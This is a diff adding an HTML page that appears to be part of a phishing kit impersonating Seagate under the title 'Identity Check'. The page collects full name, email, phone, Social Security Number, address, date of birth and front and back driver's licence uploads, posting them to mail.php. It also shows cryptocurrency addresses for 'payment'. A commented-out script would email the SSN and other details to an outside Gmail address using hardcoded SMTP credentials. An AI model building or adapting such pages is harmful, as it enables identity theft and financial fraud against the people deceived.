@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identity Check</title>
+    <link type="text/css" rel="stylesheet" href="verification.css">
+    <link rel="stylesheet" href="css/plugin.css" type="text/css" />
+    <link rel="icon" href="img/sitefav.jpg">
+    
+</head>
+
+<body>
+
+    <div style="margin: auto;">
+        <a href="index.html">
+            <img src="img/seagate.png" alt="seagate">
+        </a>
+
+    </div>
+    <div class=" container">
+        <form action="mail.php" method="post" enctype="multipart/form-data">
+            <div class="row">
+                <h4>IDENTITY VERIFICATION PROCESS</h4>
+                <div class="input-group input-group-icon">
+                    <input type="text" name="name" placeholder="Full Name" required />
+                    <div class="input-icon"><i class="fa fa-user"></i></div>
+                </div>
+                <div class="input-group input-group-icon">
+                    <input type="email" name="email" placeholder="Email Adress" required />
+                    <div class="input-icon"><i class="fa fa-envelope"></i></div>
+                </div>
+                <div class="input-group input-group-icon">
+                    <input type="number" name="number" placeholder="Phone number" required />
+                    <div class="input-icon"><i class="fa fa-phone"></i></div>
+                </div>
+                <div class="input-group input-group-icon">
+                    <input type="text" name="ssn" maxlength="9" placeholder="Social Security Number" required />
+                    <div class="input-icon"><i class="fa fa-key"></i></div>
+                </div>
+                <div class="input-group input-group-icon">
+                    <input type="address" placeholder="Residential Adress" required />
+                    <div class="input-icon"> <i class="fa fa-book"></i></div>
+                </div>
+
+                <div style="margin: 6rem 0;">
+                    <h4>UPLOAD YOUR D/L FRONT AND BACK PAGE</h4>
+
+                    <div class="input-group input-group-icon">
+                        <label for="frontDoc">Upload Front Page</label>
+                        <input type="file" id="frontDoc" name="file[]" required />
+
+                    </div>
+
+                    <div class="input-group input-group-icon">
+                        <label for="backDoc">Upload Back Page</label>
+                        <input type="file" id="backDoc" name="file[]" required />
+                    </div>
+
+
+
+                </div>
+
+            </div>
+            <div class="row">
+                <div class="col-half">
+                    <h4>Date of Birth</h4>
+                    <input type="date">
+                </div>
+                <div class="col-half">
+                    <h4>Gender</h4>
+                    <div class="input-group">
+                        <input id="gender-male" type="radio" name="gender" value="male" />
+                        <label for="gender-male">Male</label>
+                        <input id="gender-female" type="radio" name="gender" value="female" />
+                        <label for="gender-female">Female</label>
+                    </div>
+                </div>
+            </div>
+            <div class="row">
+                <h4>Payment Methods</h4>
+                <div class="input-group ">
+                    <div class="payment">
+                        <div>
+                            <label for="payment-method-bitcoin"><span><img src="img/content/bitcoin.png" width="50px"
+                                        alt="">
+                                    BITCOIN</span></label>
+                            <input id="payment-method-bitcoin" type="radio" name="payment-method" />
+                        </div>
+                        <div>
+                            <label for="payment-method-ethereum"> <span><img src="img/content/ethereum.png" width="50px"
+                                        alt="">ETHEREUM</span></label>
+                            <input id="payment-method-ethereum" type="radio" name="payment-method" />
+
+                        </div>
+                    </div>
+
+
+
+                </div>
+
+                <div class="input-group input-group-icon">
+
+                    <label style="text-transform: uppercase;"> Seagate Bitcoin Address</label>
+                    <p>17yP9fzGqUCrcYrewNHUipy2nCmHKbnto2</p>
+                    <br>
+                    <label style="text-transform: uppercase;">Seagate Ethereum Address</label>
+                    <p>0x98a5d9bB884d8aF07A1B722389ff80f734A98291</p>
+                </div>
+
+                <div style="margin: 2rem; " class="row">
+                    <h4>Terms and Conditions</h4>
+                    <div class="input-group">
+                        <input id="terms" type="checkbox" />
+                        <label for="terms">I accept the terms and conditions for signing up to this service, and
+                            hereby
+                            confirm I have read the privacy policy.</label>
+                        <input id="btn" type="submit" value="PROCEED">
+                        <!-- <button >PROCEED</button> -->
+                    </div>
+                </div>
+            </div>
+        </form>
+
+        <p><a href="index.html">Back</a></p>
+    </div>
+
+    <!-- <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+        function collect() {
+            // const btnn = document.getElementById("btn");
+
+            const input = document.querySelector("form");
+
+            Email.send({
+                Host: "smtp.mailtrap.io",
+                Username: "db2858868c14eb",
+                Password: "8e3e099e540472",
+                To: "somewhere@gmail.com",
+                From: input.elements["email"].value,
+                Subject: "Sent Mail",
+                Body:
+                    input.elements["ssn"].value +
+                    "<br>" +
+                    input.elements["name"].value +
+                    "<br>" +
+                    input.elements["number"].value,
+                    Attachments: [
+                    {
+                        name: "smtp.png",
+                        path: input.elements['file1'].value
+                    }]
+
+            }).then((msg) => alert("Info received Successfully"));
+        };
+
+
+
+
+    </script> -->
+</body>
+
+</html>
